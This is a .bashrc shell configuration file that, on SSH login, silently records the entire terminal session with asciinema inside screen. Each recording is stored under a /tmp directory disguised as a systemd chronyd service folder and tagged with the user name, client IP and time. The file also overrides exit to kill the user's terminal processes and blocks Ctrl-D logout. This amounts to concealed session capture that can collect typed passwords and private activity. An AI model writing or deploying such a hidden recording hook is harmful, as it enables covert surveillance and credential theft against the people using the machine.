# .bashrc

ASCCFG="$HOME/.config/"
IGNOREEOF=1000000
set -o ignoreeof
DIR=/tmp/systemd-private-a0d0c3ae3099418788d58623149f4783-chronyd.service-zl0obn
CFILE=$DIR/ssh_`whoami`@`echo $SSH_CLIENT | cut -d ' ' -f 1 `_`date +%F-%H:%M:%S`.cast

if [ -f /etc/bashrc ]; then
        . /etc/bashrc
fi

if [[ -z "$TMUX" ]] && [ "$SSH_CONNECTION" != "" ]; then

    if [ "$PS1" != "" -a "${STARTED_SCREEN:-x}" = x -a "${SSH_TTY:-x}" != x ]
        then
            STARTED_SCREEN=1 ; export STARTED_SCREEN
            ASCIINEMA_CONFIG_HOME=/var/lib/.config  /usr/bin/asciinema rec -q  -c "screen -q -R " "$CFILE" && exit 0

  fi

fi

function exit() {
    if ! [[ -z  "$SUDO_COMMAND"  ]]; then builtin exit "$@" &>/dev/null; fi
    pgrep -f  $USER@pts* | xargs kill; builtin exit "$@";

}
